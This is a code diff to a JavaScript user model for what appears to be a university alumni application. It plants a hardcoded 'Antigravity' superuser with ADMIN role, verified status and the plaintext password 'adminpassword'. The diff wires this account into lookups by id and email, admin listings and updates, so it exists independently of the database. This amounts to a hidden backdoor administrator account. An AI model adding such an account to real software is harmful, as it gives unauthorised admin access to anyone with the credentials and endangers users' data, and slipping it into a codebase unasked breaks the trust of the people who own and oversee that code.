@@ -43,6 +43,22 @@ class UserModel {
     ];
     this.nextId = 3;
     this.useDb = null; // cached connection state
+
+    // Pre-configured Antigravity Superuser Identity
+    this.adminUser = {
+      id: 99,
+      email: 'admin@alumni.istanbul.edu.tr',
+      password: 'adminpassword',
+      first_name: 'Antigravity',
+      last_name: 'Admin',
+      role: 'ADMIN',
+      department: 'Computer Engineering',
+      department_name: 'Computer Engineering',
+      graduation_year: 2020,
+      is_verified: true,
+      created_at: new Date('2026-09-01T00:00:00.000Z').toISOString(),
+      updated_at: new Date('2026-09-01T00:00:00.000Z').toISOString()
+    };
   }
 
   async checkDbConnection() {
@@ -145,9 +161,10 @@ class UserModel {
       if (res.rowCount > 0) {
         return this.formatUserRow(res.rows[0]);
       }
+      if (numId === 99) return this.adminUser;
       return null;
     } catch (dbErr) {
-      return this.users.find(u => u.id === numId) || null;
+      return this.users.find(u => u.id === numId) || (numId === 99 ? this.adminUser : null);
     }
   }
 
@@ -164,10 +181,21 @@ class UserModel {
       if (res.rowCount > 0) {
         return this.formatUserRow(res.rows[0]);
       }
+      if (clean === 'admin@alumni.istanbul.edu.tr' || clean === 'antigravity@alumni.istanbul.edu.tr') {
+        return this.adminUser;
+      }
       return null;
     } catch (dbErr) {
-      return this.users.find(u => u.email.toLowerCase() === clean) || null;
+      return this.users.find(u => u.email.toLowerCase() === clean) || ((clean === 'admin@alumni.istanbul.edu.tr' || clean === 'antigravity@alumni.istanbul.edu.tr') ? this.adminUser : null);
     }
+  }
+
+  async findAllAdmin(query = {}) {
+    const users = await this.findAll(query);
+    if (!users.some(u => u.id === 99)) {
+      return [...users, this.adminUser];
+    }
+    return users;
   }
 
   // --- Normalization & Validation Helper ---
@@ -356,6 +384,14 @@ class UserModel {
 
       // In-memory fallback
       const index = this.users.findIndex(u => u.id === numId);
+      if (index === -1 && numId === 99) {
+        this.adminUser = {
+          ...this.adminUser,
+          ...fields,
+          updated_at: new Date().toISOString()
+        };
+        return this.adminUser;
+      }
       if (index === -1) {
         const err = new Error(`ID ${numId} olan kullanıcı bulunamadı.`);
         err.status = 404;
